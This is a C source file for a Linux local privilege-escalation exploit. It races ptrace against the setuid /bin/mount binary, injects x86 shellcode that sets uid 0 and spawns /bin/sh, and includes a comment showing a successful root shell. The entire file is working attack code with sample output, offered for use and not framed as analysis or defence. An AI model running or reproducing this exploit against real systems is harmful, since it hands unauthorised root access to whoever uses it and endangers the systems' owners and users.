/*
*   matthew@matthew-desktop:~$ while `/bin/true/`;do ./shoryuken;done
*   [ WIN! 18281
*   [ Overwritten 0xb8097430
*   # id
*   uid=0(root) gid=1000(matthew) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),
*   44(video),46(plugdev),107(fuse),109(lpadmin),115(admin),1000(matthew)
*   #
*/
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <linux/user.h>
#include <stdio.h>
#include <fcntl.h>

char shellcode[]= 
                 "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                 "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                 "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                 "\x90"
                 "\x6a\x23\x58\x31"
                 "\xdb\xcd\x80"
                 "\x31\xdb\x8d\x43\x17\xcd\x80\x31\xc0"
                 "\x50\x68""//sh""\x68""/bin""\x89\xe3\x50"
                 "\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

int main() {
    pid_t child;
    int eip, i = 0;
    struct user_regs_struct regs;
    char *argv[] = {"mount",0};
    char *envp[] = {"",0};
    child = fork();
    if(child == 0) {
    execve("/bin/mount",argv,envp);
    } else {
        if(ptrace(PTRACE_ATTACH, child, NULL, NULL) == 0) {
                char buf[256];
                sprintf(buf, "/proc/%d/cmdline", child);
                int fd = open(buf, O_RDONLY);
                read(fd, buf, 2);
                close(fd);
                if(buf[0] == 'm') {
                        printf("[ WIN! %d\n", child);
                        fflush(stdout);
                        ptrace(PTRACE_GETREGS, child, NULL, &regs);
                        eip = regs.eip;
                        while (i < strlen(shellcode)) {
                        ptrace(PTRACE_POKETEXT, child, eip, (int) *(int *) (shellcode + i));
                        i += 4;
                        eip += 4;
                        }
                        printf("[ Overwritten 0x%x\n",regs.eip);
                        ptrace(PTRACE_SETREGS, child, NULL, &regs);
                        ptrace(PTRACE_DETACH, child, NULL,NULL);
                        usleep(1);
                        wait(0);
                }
            }
    }
    return 0;
}
